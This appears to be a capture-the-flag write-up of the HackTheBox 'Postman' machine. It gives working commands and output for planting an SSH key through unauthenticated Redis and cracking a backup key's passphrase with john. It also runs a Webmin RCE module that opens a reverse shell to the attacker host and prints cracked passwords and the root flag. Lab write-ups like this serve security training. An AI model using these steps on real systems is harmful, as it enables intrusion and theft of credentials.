@@ -1,0 +1,181 @@
+First after namp -p- scan
+Found out that redis is serve at 6379.
+We can found an article :
+https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/
+https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+To test if the redis need auth or not:
+root@kali:~/Desktop/htb/postman# telnet 10.10.10.160 6379
+Trying 10.10.10.160...
+Connected to 10.10.10.160.
+Escape character is '^]'.
+echo "Hey no AUTH required!"
+$21
+Hey no AUTH required!
+quit
++OK
+Connection closed by foreign host.
+
+Vulns confirmed.
+
+
+Now adding our ssh key to the server's .ssh authorize_key.
+> ssh-keygen -f postman
+> chomod 600 postman
+
+
+Now trying to exploit redis, by adding our ssh key to server:
+> (echo -e "\n\n"; cat postman.pub; echo -e "\n\n") > unauth_write.txt
+
+I write a script to exploit ( Remember First echo the .txt ):
+
+root@kali:~/Desktop/htb/postman# cat exploit_add_ssh_topostman.sh 
+#!/bin/sh
+cat unauth_write.txt | redis-cli -h 10.10.10.160 -x set crackit
+redis-cli -h 10.10.10.160 config get dir
+redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
+redis-cli -h 10.10.10.160 save
+
+
+remember to chmod +x to it.
+
+
+
+now run the exploit , and login as redis ( you can found username but config get dir )
+
+root@kali:~/Desktop/htb/postman# ./exploit_add_ssh_topostman.sh 
+OK
+1) "dir"
+2) "/var/lib/redis/.ssh"
+OK
+OK
+
+root@kali:~/Desktop/htb/postman# ssh -i postman redis@10.10.10.160
+Enter passphrase for key 'postman': qweasdzxc
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Nov  7 09:55:28 2019 from 10.10.14.211
+redis@Postman:~$ 
+
+
+now cat the bash history to find details:
+
+redis@Postman:~$ cat .bash_history
+exit
+su Matt
+pwd
+nano scan.py
+python scan.py
+nano scan.py
+clear
+nano scan.py
+clear
+python scan.py
+exit
+exit
+cat /etc/ssh/sshd_config 
+su Matt
+clear
+cd /var/lib/redis
+su Matt
+exit
+cat id_rsa.bak 
+ls -la
+exit
+cat id_rsa.bak 
+exit
+ls -la
+crontab -l
+systemctl enable redis-server
+redis-server
+ifconfig
+netstat -a
+netstat -a
+netstat -a
+netstat -a
+netstat -a > txt
+exit
+crontab -l
+cd ~/
+ls
+nano 6379
+exit
+
+
+There's a id_rsa.bak
+Let's try to find it:
+redis@Postman:~$ find / -name "id_rsa.bak" 2>/dev/null
+/opt/id_rsa.bak
+
+
+
+download it using scp
+we can crack it via john
+but first download ssh2john.py :
+https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+
+now
+> python ssh2john id_rsa.bak > crack.john
+> john --wordlist=/root/rockyou.txt crack.john
+> john --show crack.john
+
+got password
+root@kali:~/Desktop/htb/postman# john --show crack.john 
+id_rsa.bak:computer2008
+
+1 password hash cracked, 0 left
+
+Now login as redis , and su - Matt 
+redis@Postman:~$ su - Matt
+Password: computer2008
+Matt@Postman:~$ 
+
+==============================================
+
+Root Shell:
+
+We can login as Matt using creds above , so Matt is a webmin user:
+https://www.exploit-db.com/exploits/46984
+using msf console:
+
+
+msf5 exploit(linux/http/webmin_packageup_rce) > use linux/http/webmin_packageup_rce
+msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
+RHOSTS => 10.10.10.160
+msf5 exploit(linux/http/webmin_packageup_rce) > set LHOSTS 10.10.14.90
+LHOSTS => 10.10.14.90
+msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
+SSL => true
+msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
+USERNAME => Matt
+msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
+PASSWORD => computer2008
+msf5 exploit(linux/http/webmin_packageup_rce) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.90:4444 
+[+] Session cookie: 995daa6b64964cc7eb95f942061b3047
+[*] Attempting to execute the payload...
+[*] Command shell session 2 opened (10.10.14.90:4444 -> 10.10.10.160:49688) at 2019-11-07 05:14:39 -0500
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+root@Postman:/usr/share/webmin/package-updates/# whoami
+whoami
+root
+root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
+cat /root/root.txt
+a257741c5bed8be7778c6ed95686ddce
+root@Postman:/usr/share/webmin/package-updates/#
+
+
+ok we got root now.
+
